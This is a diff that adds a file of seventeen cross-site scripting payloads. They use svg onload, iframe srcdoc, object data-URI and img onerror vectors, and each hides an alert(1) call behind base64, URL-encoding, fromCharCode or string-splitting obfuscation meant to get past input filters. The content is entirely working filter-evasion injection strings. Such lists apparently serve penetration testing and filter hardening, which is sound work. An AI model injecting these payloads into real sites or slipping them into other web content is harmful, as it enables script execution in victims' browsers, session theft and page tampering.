@@ -1,0 +1,17 @@
+<svg onload=window[unescape('%61%6C%65%72%74')](1)>
+<object data=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+></object>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=setTimeout(decodeURIComponent('%61%6C%65%72%74(1)'),0)>
+<iframe srcdoc="<img src=x onerror=setTimeout(eval(String.fromCharCode(97,108,101,114,116,40,49,41)),0)>"></iframe>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6C%65%72%74(1)'))>"></iframe>
+<object data="data:text/html,<svg onload=eval(atob('YWxlcnQoMSk='))>"></object>
+<svg onload=eval(String['fromCharCode'](97,108,101,114,116,40,49,41))>
+<object data="data:text/html,<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></object>
+<svg onload=eval(unescape('%61%6C%65%72%74(1)'))>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<object data="data:text/html,<svg onload=setTimeout('al'+'ert(1)',0)>"></object>
+<object data="data:text/html,<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"></object>
+<svg onload=eval(String['fromCharCode'](97,108,101,114,116).concat('(1)'))>
+<svg onload=setTimeout('al'+'ert(1)',0)>
+<object data="data:text/html,<svg onload=window['al'+'ert'](1)>"></object>
